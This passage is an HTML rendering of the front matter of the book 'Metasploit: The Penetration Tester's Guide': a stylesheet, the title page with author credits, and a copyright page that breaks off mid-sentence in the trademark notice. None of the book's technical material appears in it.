<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Metasploit: The Penetration Tester&#39;s Guide</title><meta name="author" content="David Kennedy"/><meta name="keywords" content="Computers, Security, Viruses &amp; Malware, General, Internet, Online Safety &amp; Privacy, Library_1"/><style type="text/css"> * {margin:0; padding:0; text-indent:0; }
 h1 { color: #E4E4E4; font-family:Arial, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 92pt; }
 .s1 { color: #D6ECEC; font-family:"Lucida Sans", sans-serif; font-style: italic; font-weight: normal; text-decoration: none; font-size: 46pt; }
 .s2 { color: #FFF; font-family:"Lucida Sans", sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 22pt; }
 .s3 { color: #D6ECEC; font-family:Arial, sans-serif; font-style: italic; font-weight: bold; text-decoration: none; font-size: 20pt; }
 .s4 { color: black; font-family:Arial, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 12pt; }
 h2 { color: black; font-family:Arial, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 48pt; }
 h4 { color: black; font-family:Arial, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 28pt; }
 .s5 { color: black; font-family:Calibri, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 18pt; }
 .s6 { color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8pt; }
 .s7 { color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 12pt; }
 .s8 { color: black; font-family:Arial, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 8pt; }
 .s9 { color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8pt; }
 .s10 { color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8pt; }
 .s11 { color: black; font-family:Arial, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 16pt; }
 .a, a { color: black; font-family:"Arial Unicode MS", sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 9pt; }
 .s12 { color: black; font-family:"Arial Unicode MS", sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 9pt; }
 .s13 { color: black; font-family:Verdana, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 9pt; }
 .s14 { color: black; font-family:"Arial Unicode MS", sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 6pt; }
 .s15 { color: black; font-family:Arial, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 10pt; }
 .s16 { color: black; font-family:Arial, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 10pt; }
 .s17 { color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 14pt; }
 .p, p { color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10pt; margin:0pt; }
 .s18 { color: black; font-family:"Book Antiqua", serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 10pt; }
 .s19 { color: black; font-family:"Book Antiqua", serif; font-style: italic; font-weight: normal; text-decoration: none; font-size: 10pt; }
 .s20 { color: black; font-family:"Book Antiqua", serif; font-style: italic; font-weight: normal; text-decoration: none; font-size: 10pt; }
 .s21 { color: black; font-family:"Century Gothic", sans-serif; font-style: italic; font-weight: bold; text-decoration: none; font-size: 12pt; }
 .s22 { color: black; font-family:Arial, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 9pt; }
 .s23 { color: black; font-family:Verdana, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 10pt; }
 .s24 { color: black; font-family:Calibri, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 8.5pt; }
 .s25 { color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 .s27 { color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 1pt; }
 .s28 { color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 .s29 { color: black; font-family:Arial, sans-serif; font-style: italic; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 .s30 { color: black; font-family:"Arial Unicode MS", sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 .s31 { color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10pt; }
 .s32 { color: black; font-family:"Arial Unicode MS", sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10pt; }
 .s33 { color: black; font-family:"Arial Unicode MS", sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 .s34 { color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 .s35 { color: black; font-family:Calibri, sans-serif; font-style: italic; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 .s36 { color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 0.5pt; }
 .s37 { color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 .s38 { color: black; font-family:"Book Antiqua", serif; font-style: italic; font-weight: normal; text-decoration: none; font-size: 14pt; }
 .s39 { color: #231F20; font-family:"Arial Unicode MS", sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 9pt; }
 .s40 { color: black; font-family:Calibri, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 8.5pt; }
 .s41 { color: black; font-family:"Book Antiqua", serif; font-style: italic; font-weight: normal; text-decoration: none; font-size: 9pt; }
 .s42 { color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 9pt; }
 .s43 { color: black; font-family:Calibri, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 8.5pt; }
 .s44 { color: black; font-family:Calibri, sans-serif; font-style: italic; font-weight: bold; text-decoration: none; font-size: 8.5pt; }
 .s45 { color: black; font-family:"Arial Unicode MS", sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8pt; }
 .s46 { color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 7.5pt; }
 .s47 { color: black; font-family:Arial, sans-serif; font-style: italic; font-weight: normal; text-decoration: none; font-size: 8pt; }
 .s48 { color: black; font-family:"Arial Unicode MS", sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8pt; }
 .s49 { color: black; font-family:Webdings, serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10pt; }
 .s51 { color: black; font-family:"Courier New", monospace; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 .s52 { color: black; font-family:"Book Antiqua", serif; font-style: italic; font-weight: bold; text-decoration: none; font-size: 10pt; }
 .s53 { color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 14pt; }
 .s54 { color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10pt; }
 .s55 { color: black; font-family:Verdana, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 11pt; }
 .s56 { color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8pt; }
 .s57 { color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 7pt; }
 .s58 { color: black; font-family:Calibri, sans-serif; font-style: italic; font-weight: normal; text-decoration: none; font-size: 8pt; }
 .s59 { color: #9D9FA2; font-family:"Gill Sans MT", sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 18pt; }
 .s60 { color: #231F20; font-family:"Gill Sans MT", sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 20pt; }
 .s62 { color: #9D9FA2; font-family:"Gill Sans MT", sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 15pt; }
 .s63 { color: #231F20; font-family:"Gill Sans MT", sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 13pt; }
 .s65 { color: black; font-family:"Gill Sans MT", sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10pt; }
 .s67 { color: #9D9FA2; font-family:"Gill Sans MT", sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 21pt; }
 .s68 { color: black; font-family:Arial, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 30pt; }
 .s70 { color: black; font-family:"Book Antiqua", serif; font-style: italic; font-weight: normal; text-decoration: none; font-size: 12pt; }
 .s71 { color: black; font-family:Arial, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10pt; }
 .s72 { color: black; font-family:Arial, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 14pt; }
 .s73 { color: black; font-family:"Book Antiqua", serif; font-style: italic; font-weight: normal; text-decoration: none; font-size: 7pt; }
 .s74 { color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 5.5pt; }
 .s75 { color: black; font-family:Arial, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 3.5pt; vertical-align: 5pt; }
 .s76 { color: black; font-family:Arial, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 3.5pt; }
 .s77 { color: black; font-family:Calibri, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 6pt; }
 .s78 { color: black; font-family:Calibri, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 8pt; }
 .s79 { color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 6pt; }
 .s80 { color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 6pt; }
 h3 { color: #E4E4E4; font-family:Arial, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 40pt; }
 .s81 { color: #FFF; font-family:"Lucida Sans", sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 14pt; }
 .s83 { color: #E4E4E4; font-family:Webdings, serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 13pt; vertical-align: 1pt; }
 .s84 { color: #E4E4E4; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 13pt; }
 .s85 { color: #FFF; font-family:"Century Gothic", sans-serif; font-style: italic; font-weight: bold; text-decoration: none; font-size: 5pt; }
 .s86 { color: #FFF; font-family:"Arial Unicode MS", sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 6pt; }
 .s87 { color: #FFF; font-family:Verdana, sans-serif; font-style: italic; font-weight: normal; text-decoration: none; font-size: 5pt; }
 .s88 { color: #1C1C1A; font-family:Arial, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 10pt; }
 .s89 { color: #1C1C1A; font-family:Arial, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 8.5pt; }
 li {display: block; }
 #l1 {padding-left: 0pt; }
 #l1> li>*:first-child:before {content: " "; color: black; font-family:Wingdings; font-style: normal; font-weight: normal; text-decoration: none; font-size: 6pt; }
 li {display: block; }
 #l2 {padding-left: 0pt; }
 #l2> li>*:first-child:before {content: " "; color: black; font-family:Wingdings; font-style: normal; font-weight: normal; text-decoration: none; font-size: 6pt; }
 li {display: block; }
 #l3 {padding-left: 0pt;counter-reset: e1 1; }
 #l3> li>*:first-child:before {counter-increment: e1; content: counter(e1, decimal)". "; color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10pt; }
 #l3> li:first-child>*:first-child:before {counter-increment: e1 0;  }
 li {display: block; }
 #l4 {padding-left: 0pt;counter-reset: f1 1; }
 #l4> li>*:first-child:before {counter-increment: f1; content: counter(f1, decimal)". "; color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10pt; }
 #l4> li:first-child>*:first-child:before {counter-increment: f1 0;  }
 li {display: block; }
 #l5 {padding-left: 0pt;counter-reset: g1 1; }
 #l5> li>*:first-child:before {counter-increment: g1; content: counter(g1, decimal)". "; color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10pt; }
 #l5> li:first-child>*:first-child:before {counter-increment: g1 0;  }
 li {display: block; }
 #l6 {padding-left: 0pt;counter-reset: h1 1; }
 #l6> li>*:first-child:before {counter-increment: h1; content: counter(h1, decimal)". "; color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10pt; }
 #l6> li:first-child>*:first-child:before {counter-increment: h1 0;  }
 li {display: block; }
 #l7 {padding-left: 0pt;counter-reset: i1 1; }
 #l7> li>*:first-child:before {counter-increment: i1; content: counter(i1, decimal)". "; color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10pt; }
 #l7> li:first-child>*:first-child:before {counter-increment: i1 0;  }
 li {display: block; }
 #l8 {padding-left: 0pt;counter-reset: j1 1; }
 #l8> li>*:first-child:before {counter-increment: j1; content: counter(j1, decimal)". "; color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10pt; }
 #l8> li:first-child>*:first-child:before {counter-increment: j1 0;  }
 li {display: block; }
 #l9 {padding-left: 0pt;counter-reset: k1 1; }
 #l9> li>*:first-child:before {counter-increment: k1; content: counter(k1, decimal)" "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l9> li:first-child>*:first-child:before {counter-increment: k1 0;  }
 li {display: block; }
 #l10 {padding-left: 0pt;counter-reset: l1 0; }
 #l10> li>*:first-child:before {counter-increment: l1; content: counter(l1, decimal)" "; color: black; font-style: normal; font-weight: normal; text-decoration: none; }
 #l10> li:first-child>*:first-child:before {counter-increment: l1 0;  }
 li {display: block; }
 #l11 {padding-left: 0pt;counter-reset: m1 0; }
 #l11> li>*:first-child:before {counter-increment: m1; content: counter(m1, decimal)" "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l11> li:first-child>*:first-child:before {counter-increment: m1 0;  }
 li {display: block; }
 #l12 {padding-left: 0pt;counter-reset: n1 2; }
 #l12> li>*:first-child:before {counter-increment: n1; content: counter(n1, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l12> li:first-child>*:first-child:before {counter-increment: n1 0;  }
 li {display: block; }
 #l13 {padding-left: 0pt;counter-reset: o1 2; }
 #l13> li>*:first-child:before {counter-increment: o1; content: counter(o1, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l13> li:first-child>*:first-child:before {counter-increment: o1 0;  }
 li {display: block; }
 #l14 {padding-left: 0pt;counter-reset: p1 1; }
 #l14> li>*:first-child:before {counter-increment: p1; content: counter(p1, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l14> li:first-child>*:first-child:before {counter-increment: p1 0;  }
 li {display: block; }
 #l15 {padding-left: 0pt;counter-reset: q1 9; }
 #l15> li>*:first-child:before {counter-increment: q1; content: counter(q1, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l15> li:first-child>*:first-child:before {counter-increment: q1 0;  }
 li {display: block; }
 #l16 {padding-left: 0pt;counter-reset: r1 1; }
 #l16> li>*:first-child:before {counter-increment: r1; content: counter(r1, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l16> li:first-child>*:first-child:before {counter-increment: r1 0;  }
 li {display: block; }
 #l17 {padding-left: 0pt;counter-reset: s1 2; }
 #l17> li>*:first-child:before {counter-increment: s1; content: counter(s1, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l17> li:first-child>*:first-child:before {counter-increment: s1 0;  }
 #l18 {padding-left: 0pt;counter-reset: s2 2; }
 #l18> li>*:first-child:before {counter-increment: s2; content: counter(s2, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l18> li:first-child>*:first-child:before {counter-increment: s2 0;  }
 li {display: block; }
 #l19 {padding-left: 0pt;counter-reset: t1 1; }
 #l19> li>*:first-child:before {counter-increment: t1; content: counter(t1, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l19> li:first-child>*:first-child:before {counter-increment: t1 0;  }
 li {display: block; }
 #l20 {padding-left: 0pt;counter-reset: u1 1; }
 #l20> li>*:first-child:before {counter-increment: u1; content: counter(u1, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l20> li:first-child>*:first-child:before {counter-increment: u1 0;  }
 #l21 {padding-left: 0pt;counter-reset: v1 3; }
 #l21> li>*:first-child:before {counter-increment: v1; content: counter(v1, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l21> li:first-child>*:first-child:before {counter-increment: v1 0;  }
 li {display: block; }
 #l22 {padding-left: 0pt;counter-reset: w1 1; }
 #l22> li>*:first-child:before {counter-increment: w1; content: counter(w1, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l22> li:first-child>*:first-child:before {counter-increment: w1 0;  }
 li {display: block; }
 #l23 {padding-left: 0pt;counter-reset: x1 3; }
 #l23> li>*:first-child:before {counter-increment: x1; content: counter(x1, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l23> li:first-child>*:first-child:before {counter-increment: x1 0;  }
 li {display: block; }
 #l24 {padding-left: 0pt;counter-reset: y1 7; }
 #l24> li>*:first-child:before {counter-increment: y1; content: counter(y1, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l24> li:first-child>*:first-child:before {counter-increment: y1 0;  }
 li {display: block; }
 #l25 {padding-left: 0pt;counter-reset: z1 1; }
 #l25> li>*:first-child:before {counter-increment: z1; content: counter(z1, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l25> li:first-child>*:first-child:before {counter-increment: z1 0;  }
 li {display: block; }
 #l26 {padding-left: 0pt;counter-reset: c1 3; }
 #l26> li>*:first-child:before {counter-increment: c1; content: counter(c1, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l26> li:first-child>*:first-child:before {counter-increment: c1 0;  }
 li {display: block; }
 #l27 {padding-left: 0pt;counter-reset: d1 16; }
 #l27> li>*:first-child:before {counter-increment: d1; content: counter(d1, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l27> li:first-child>*:first-child:before {counter-increment: d1 0;  }
 #l28 {padding-left: 0pt;counter-reset: d2 1; }
 #l28> li>*:first-child:before {counter-increment: d2; content: counter(d2, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l28> li:first-child>*:first-child:before {counter-increment: d2 0;  }
 li {display: block; }
 #l29 {padding-left: 0pt;counter-reset: e1 2; }
 #l29> li>*:first-child:before {counter-increment: e1; content: counter(e1, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l29> li:first-child>*:first-child:before {counter-increment: e1 0;  }
 li {display: block; }
 #l30 {padding-left: 0pt;counter-reset: f1 2; }
 #l30> li>*:first-child:before {counter-increment: f1; content: counter(f1, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l30> li:first-child>*:first-child:before {counter-increment: f1 0;  }
 li {display: block; }
 #l31 {padding-left: 0pt;counter-reset: g1 1; }
 #l31> li>*:first-child:before {counter-increment: g1; content: counter(g1, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l31> li:first-child>*:first-child:before {counter-increment: g1 0;  }
 li {display: block; }
 #l32 {padding-left: 0pt;counter-reset: h1 3; }
 #l32> li>*:first-child:before {counter-increment: h1; content: "("counter(h1, upper-latin)") "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l32> li:first-child>*:first-child:before {counter-increment: h1 0;  }
 #l33 {padding-left: 0pt;counter-reset: h2 1; }
 #l33> li>*:first-child:before {counter-increment: h2; content: counter(h2, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l33> li:first-child>*:first-child:before {counter-increment: h2 0;  }
 li {display: block; }
 #l34 {padding-left: 0pt;counter-reset: i1 1; }
 #l34> li>*:first-child:before {counter-increment: i1; content: counter(i1, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l34> li:first-child>*:first-child:before {counter-increment: i1 0;  }
 li {display: block; }
 #l35 {padding-left: 0pt; }
 #l35> li>*:first-child:before {content: " "; color: black; font-family:Wingdings; font-style: normal; font-weight: normal; text-decoration: none; font-size: 6pt; }
 li {display: block; }
 #l36 {padding-left: 0pt;counter-reset: k1 1; }
 #l36> li>*:first-child:before {counter-increment: k1; content: counter(k1, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l36> li:first-child>*:first-child:before {counter-increment: k1 0;  }
 li {display: block; }
 #l37 {padding-left: 0pt;counter-reset: l1 1; }
 #l37> li>*:first-child:before {counter-increment: l1; content: counter(l1, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l37> li:first-child>*:first-child:before {counter-increment: l1 0;  }
 li {display: block; }
 #l38 {padding-left: 0pt;counter-reset: m1 1; }
 #l38> li>*:first-child:before {counter-increment: m1; content: counter(m1, decimal)". "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8.5pt; }
 #l38> li:first-child>*:first-child:before {counter-increment: m1 0;  }
 li {display: block; }
 #l39 {padding-left: 0pt; }
 #l39> li>*:first-child:before {content: " "; color: black; font-family:Wingdings; font-style: normal; font-weight: normal; text-decoration: none; font-size: 6pt; }
 li {display: block; }
 #l40 {padding-left: 0pt;counter-reset: o1 1; }
 #l40> li>*:first-child:before {counter-increment: o1; content: counter(o1, decimal)". "; color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10pt; }
 #l40> li:first-child>*:first-child:before {counter-increment: o1 0;  }
 li {display: block; }
 #l41 {padding-left: 0pt;counter-reset: p1 1; }
 #l41> li>*:first-child:before {counter-increment: p1; content: counter(p1, decimal)". "; color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10pt; }
 #l41> li:first-child>*:first-child:before {counter-increment: p1 0;  }
 li {display: block; }
 #l42 {padding-left: 0pt;counter-reset: q1 1; }
 #l42> li>*:first-child:before {counter-increment: q1; content: counter(q1, decimal)". "; color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10pt; }
 #l42> li:first-child>*:first-child:before {counter-increment: q1 0;  }
 li {display: block; }
 #l43 {padding-left: 0pt;counter-reset: r1 1; }
 #l43> li>*:first-child:before {counter-increment: r1; content: counter(r1, decimal)". "; color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10pt; }
 #l43> li:first-child>*:first-child:before {counter-increment: r1 0;  }
 li {display: block; }
 #l44 {padding-left: 0pt;counter-reset: s1 1; }
 #l44> li>*:first-child:before {counter-increment: s1; content: counter(s1, decimal)". "; color: black; font-family:"Bookman Old Style", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10pt; }
 #l44> li:first-child>*:first-child:before {counter-increment: s1 0;  }
 table, tbody {vertical-align: top; overflow: visible; }
</style></head><body><p style="text-indent: 0pt;text-align: left;"><span><img width="672" height="888" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_001.png"/></span></p><h1 style="padding-left: 5pt;text-indent: 0pt;line-height: 103pt;text-align: center;">Metasploit</h1><p class="s1" style="padding-left: 5pt;text-indent: 0pt;line-height: 52pt;text-align: center;">The Penetration Tester’s Guide</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s2" style="padding-top: 3pt;padding-left: 5pt;text-indent: 0pt;text-align: center;">David Kennedy, Jim O’Gorman, Devon Kearns, and Mati Aharoni</p><p class="s3" style="padding-top: 2pt;padding-left: 5pt;text-indent: 0pt;text-align: center;">Foreword by HD Moore</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-top: 6pt;text-indent: 0pt;text-align: right;">METASPLOIT</p><p style="text-indent: 0pt;text-align: left;"><br/></p><h2 style="padding-top: 19pt;padding-left: 29pt;text-indent: 0pt;text-align: center;">METASPLOIT</h2><h4 style="padding-top: 30pt;padding-left: 29pt;text-indent: 0pt;line-height: 87%;text-align: center;">The Penetration Tester’s Guide </h4><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s5" style="padding-top: 31pt;padding-left: 29pt;text-indent: 0pt;line-height: 22pt;text-align: center;">by  David Kennedy, </p><p class="s5" style="padding-left: 83pt;text-indent: 0pt;text-align: center;">Jim  O’Gorman, Devon Kearns, and  Mati Aharoni </p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 202pt;text-indent: 0pt;text-align: left;"><span><img width="44" height="50" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_002.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s6" style="padding-left: 193pt;text-indent: 0pt;line-height: 8pt;text-align: left;"><span><img width="19" height="9" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_003.png"/></span> <span><img width="49" height="11" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_004.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 205pt;text-indent: 0pt;line-height: 8pt;text-align: left;"><span><img width="41" height="11" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_005.png"/></span></p><p class="s7" style="padding-top: 13pt;padding-left: 29pt;text-indent: 0pt;text-align: center;">San Francisco</p><p class="s8" style="padding-top: 4pt;padding-left: 18pt;text-indent: 0pt;text-align: left;"><a name="bookmark0">METASPLOIT. </a><span class="s9">Copyright © 2011 by David Kennedy, Jim O&#39;Gorman, Devon Kearns, and Mati Aharoni</span></p><p class="s9" style="padding-top: 8pt;padding-left: 18pt;text-indent: 0pt;line-height: 106%;text-align: justify;">All rights reserved. No part of this work may be reproduced or transmitted in any form or by any means, electronic or mechanical, including photocopying, recording, or by any information storage or retrieval system, without the prior written permission of the copyright owner and the publisher.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s9" style="padding-left: 18pt;text-indent: 0pt;text-align: left;">15 14 13 12 11 1 2 3 4 5 6 7 8 9</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s9" style="padding-left: 18pt;text-indent: 0pt;line-height: 107%;text-align: left;">ISBN-10: 1-59327-288-X ISBN-13: 978-1-59327-288-3</p><p class="s9" style="padding-top: 7pt;padding-left: 18pt;text-indent: 0pt;line-height: 106%;text-align: left;">Publisher: William Pollock Production Editor: Alison Law Cover Illustration: Hugh D’Andrade Interior Design: Octopod Studios</p><p class="s9" style="padding-left: 18pt;text-indent: 0pt;line-height: 107%;text-align: left;">Developmental Editors: William Pollock and Tyler Ortman Technical Reviewer: Scott White</p><p class="s9" style="padding-left: 18pt;text-indent: 0pt;line-height: 106%;text-align: left;">Copyeditor: Lisa Theobald Compositors: Susan Glinert Stevens Proofreader: Ward Webber</p><p class="s9" style="padding-left: 18pt;text-indent: 0pt;text-align: left;">Indexer: BIM Indexing &amp; Proofreading Services</p><p class="s9" style="padding-left: 18pt;text-indent: 0pt;line-height: 18pt;text-align: left;">For information on book distributors or translations, please contact No Starch Press, Inc. directly: No Starch Press, Inc.</p><p class="s9" style="padding-left: 18pt;text-indent: 0pt;text-align: left;">38 Ringold Street, San Francisco, CA 94103</p><p style="padding-left: 18pt;text-indent: 0pt;text-align: left;"><a href="http://www.nostarch.com/" class="s10" target="_blank">phone: 415.863.9900; fax: 415.863.9950; info@nostarch.com; www.nostarch.com</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s9" style="padding-left: 18pt;text-indent: 0pt;text-align: left;">Library of Congress Cataloging-in-Publication Data</p><p class="s9" style="padding-left: 18pt;text-indent: 0pt;text-align: left;">A catalog record of this book is available from the Library of Congress.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s9" style="padding-left: 18pt;text-indent: 0pt;line-height: 106%;text-align: left;">No Starch Press and the No Starch Press logo are registered trademarks of No Starch Press, Inc. Other product and company names mentioned herein may be the trademarks of their respective owners. Rather than use a trademark symbol with every occurrence of a trademarked name, we are using the names only in an editorial fashion and to the benefit of the trademark owner, with no intention of infringement of the 